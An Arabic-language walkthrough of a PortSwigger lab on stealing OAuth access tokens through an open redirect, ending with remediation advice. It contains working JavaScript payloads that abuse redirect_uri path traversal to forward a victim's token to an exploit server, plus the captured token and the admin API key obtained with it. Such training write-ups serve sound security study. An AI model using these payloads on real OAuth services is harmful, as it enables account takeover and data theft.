# [Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

## **`الهدف`**
قم بسرقة الـ `access token` الخاص بـحساب `admin` واستخدمه للحصول على الـ `API Key` الخاص به وقم بتقديمه كـ `Solution`.
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `wiener:peter` بعد ذلك نقوم بفحص سلسلة الـ `http requests` الخاصة بـ `OAuth` وسنكتشف أن هذا اللاب يستعمل تفويض ضمني أي أن الـ `acces token` يتم وضعه في الـ `URL`، وبما أن هذا اللاب يمنع إعادة التوجيه لروابط خارجية، فسنقوم بالبحث داخل الموقع عن روابط إعادة توجيه.

كمثال هذا الرابط الذي يستخدم للإنتقال إلى التدوينة التالية:

`https://0a3300b903125e0e80e38f9f00860074.web-security-academy.net/post/next?path=/post?postId=9`

ثم سنقوم بتجهيز سكريبت `JS` يقوم بسرقة الـ `access token`

لكن قبل ذلك سنقوم بإحضار بعض البيانات من هذا الـ `request`
```http
GET /auth?client_id=lcntmmg6nt7gw2l0xf0cr&redirect_uri=https://0a3300b903125e0e80e38f9f00860074.web-security-academy.net/oauth-callback&response_type=token&nonce=-54061406&scope=openid%20profile%20email HTTP/2
Host: oauth-0a1800cb034c5e5b80af8db302350031.oauth-server.net
Cookie: _session=zm9LGj2ZVrhg-Wd5KxwuG; _session.legacy=zm9LGj2ZVrhg-Wd5KxwuG
```

ثم سنقوم بالتوجه إلى السيرفر الموجود في اللاب ونقوم بوضع إحدي الأكواد التالية في الـ `Body` مع تغيير الـ `URL` الخاص باللاب الحالي ووضع `URL` الخاص بالسيرفر ودمجه برابط الإنتقال للتدوينة التالية ثم وضعه بعد `redirect_uri` بالإضافة إلى تغيير الـ `client_id` و `nonce`.
```html
<script> 
	if (!document.location.hash) { 
		window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' 
	} else { 
		window.location = '/?'+document.location.hash.substr(1) 
	} 
</script>
```

```html
<script>
    if (window.location.hash) {
        window.location = '/log?' + window.location.hash.substring(1);
    } else {
        window.location = 'https://oauth-0a1800cb034c5e5b80af8db302350031.oauth-server.net/auth?client_id=lcntmmg6nt7gw2l0xf0cr&redirect_uri=https://0a3300b903125e0e80e38f9f00860074.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a29003e03205ecf80a48e8e019800b7.exploit-server.net/exploit&response_type=token&nonce=-54061406&scope=openid%20profile%20email';
    }
</script>
```

ونقوم بالضغط على `Store` ثم `Deliver exploit to victim` وبعد ذلك نتوجه إلى `Acces log` لنلاحظ وجود سطر يشبه التالي
```
10.0.3.94       2026-07-27 06:32:09 +0000 "GET /log?access_token=1-dOtb5rPx0QzueKlkytivqPbiU9sTq1uZm1WolLH0A&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

فنقوم بنسخ الكود `1-dOtb5rPx0QzueKlkytivqPbiU9sTq1uZm1WolLH0A` ونعود إلى الـ `http History` لنبحث عن هذا الـ `request`.
```http
GET /me HTTP/2
Host: oauth-0a1800cb034c5e5b80af8db302350031.oauth-server.net
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer a4d5h6j8y2j8t5e147rth17re8g1reh7e8g2e4g87
```

ونقوم بإرساله إلى الـ `repeater`  ثم نقوم بتعديل الجزء الذي يلي `Authorization: Bearer` إلى الكود الذي نسخناه ونقوم بإرساله وسنجد الـ `API Key` في الـ `response`.
```http
HTTP/2 200 OK
X-Powered-By: Express
Vary: Origin
Access-Control-Allow-Origin: https://0a3300b903125e0e80e38f9f00860074.web-security-academy.net
Access-Control-Expose-Headers: WWW-Authenticate
Pragma: no-cache
Cache-Control: no-cache, no-store
Content-Type: application/json; charset=utf-8
Date: Mon, 27 Jul 2026 06:42:19 GMT
Keep-Alive: timeout=5
Content-Length: 152

{"sub":"administrator","apikey":"XeaNzqqj7Lh6BxZMFfH50pqi04a0gwHL","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
```

فنقوم بنسخه ثم التوجه إلى اللاب مرة أخرى ونضغط على `Submit Solution` ونضعه كـ `Answer` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب التوقف نهائيًا عن استخدام نوع التفويض الضمني `Implicit Flow` في الـ `OAuth` لأنه يعتبر قديم وغير آمن لانه يضع الـ `acces token` كـ `URL Fragment` ويجب الإنتقال لإستخدام نوع رمز التفويض `Authorization Code Flow`.

ويجب تنفيذ تحقق صارم من رابط العودة، حيث يقوم سيرفر `OAuth` بمطابقة الرابط المرسل في الطلب مع الرابط المسجل لديه تطابقًا تامًا `Exact Match` حيث يتم رفض أي طلب يحتوى على إضافات، مسارات فرعية، رموز مثل `../`، ولا يكتفي فقط بالتأكد من أن الرابط يبدأ بالدومين الصحيح.
